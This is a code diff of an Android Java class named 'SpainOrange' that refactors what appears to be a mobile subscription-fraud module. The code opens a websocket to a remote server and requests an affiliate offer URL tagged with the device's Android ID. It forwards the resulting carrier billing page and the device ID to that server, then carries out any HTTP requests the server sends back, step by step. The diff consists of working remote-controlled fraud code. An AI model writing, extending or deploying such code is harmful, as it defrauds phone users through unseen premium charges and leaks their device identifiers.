@@ -31,93 +31,100 @@ public class SpainOrange extends SubCall {
 
 
     @Override
-    public void sub(String host) {
+    public void sub(String text) {
 
 
-        OkHttpClient client = new OkHttpClient.Builder().build();
+        final Info info = parseInfo(text);
 
+        if (info != null) {
 
-        //ws://10.0.2.2:8010/ws
-        final Request request = new Request.Builder().url(host).build();
+            OkHttpClient client = new OkHttpClient.Builder().build();
 
+            //ws://10.0.2.2:8010/ws
+            final Request request = new Request.Builder().url(info.getSocket()).build();
 
-        client.newWebSocket(request, new WebSocketListener() {
-            @Override
-            public void onOpen(WebSocket webSocket, Response response) {
-                super.onOpen(webSocket, response);
+            client.newWebSocket(request, new WebSocketListener() {
+                @Override
+                public void onOpen(WebSocket webSocket, Response response) {
+                    super.onOpen(webSocket, response);
 
-                LogUtils.i("websocket open !");
+                    LogUtils.i("websocket open !");
 
-                report(SUB_REQEUST);
+                    report(SUB_REQEUST);
 
-                try {
+                    try {
 
-                    SubResponse s = http().get("http://offer.allcpx.com/offer/track?offer=271&clickId=" + androidId, header);
+                        //http://offer.allcpx.com/offer/track?offer=271&clickId=
+                        SubResponse s = http().get(info.getSubUrl() + androidId, header);
 
-                    if (s.response().code() == 200 && s.url().startsWith("http://enabler.dvbs.com/session/cardm/wap")) {
+                        if (s.response().code() == 200 && s.url().startsWith("http://enabler.dvbs.com/session/cardm/wap")) {
 
-                        Map<String, String> data = new ArrayMap<>();
+                            Map<String, String> data = new ArrayMap<>();
 
-                        data.put("location", s.url());
-                        data.put("html", s.body());
-                        data.put("vid", androidId);
+                            data.put("location", s.url());
+                            data.put("html", s.body());
+                            data.put("vid", androidId);
 
-                        webSocket.send(JSON.toJSONString(data));
+                            webSocket.send(JSON.toJSONString(data));
 
-                        report("step1", s.url());
+                            report("step1", s.url());
 
-                    } else {
-                        throw new Exception(s.toString());
+                        } else {
+                            throw new Exception(s.toString());
+                        }
+
+                    } catch (Exception e) {
+                        LogUtils.e(e);
+
+                        r.e("step1_error", e);
                     }
 
-                } catch (Exception e) {
-                    LogUtils.e(e);
-
-                    r.e("step1_error", e);
                 }
 
-            }
+
+                private int num = 1;
+
+                @Override
+                public void onMessage(WebSocket webSocket, String text) {
+                    super.onMessage(webSocket, text);
 
 
-            private int num = 1;
+                    num++;
 
-            @Override
-            public void onMessage(WebSocket webSocket, String text) {
-                super.onMessage(webSocket, text);
+                    try {
+                        HttpReqest httpReqest = JSON.parseObject(text, HttpReqest.class);
 
+                        httpReqest.setHttp(http());
 
-                num++;
+                        SubResponse response = httpReqest.call();
 
-                try {
-                    HttpReqest httpReqest = JSON.parseObject(text, HttpReqest.class);
+                        if (response.url().startsWith("https://www.google.com")) {
 
-                    httpReqest.setHttp(http());
+                            r.w("step" + num, response.flowUrls());
+                            return;
+                        }
 
-                    SubResponse response = httpReqest.call();
+                        report("step" + num, response.toString());
 
-                    if (response.url().startsWith("https://www.google.com")) {
-
-                        r.w("step" + num, response.flowUrls());
-                        return;
+                    } catch (Exception e) {
+                        LogUtils.e(e);
+                        r.e("step" + num + "_error", e);
                     }
 
-                    report("step" + num, response.toString());
-
-                } catch (Exception e) {
-                    LogUtils.e(e);
-                    r.e("step" + num + "_error", e);
                 }
 
-            }
 
+                @Override
+                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+                    super.onFailure(webSocket, t, response);
 
-            @Override
-            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
-                super.onFailure(webSocket, t, response);
+                    LogUtils.e("websocket error", t);
 
-                LogUtils.e("websocket error", t);
-            }
-        });
+                    r.e("websokect_error", t);
 
+                }
+            });
+
+        }
     }
 }
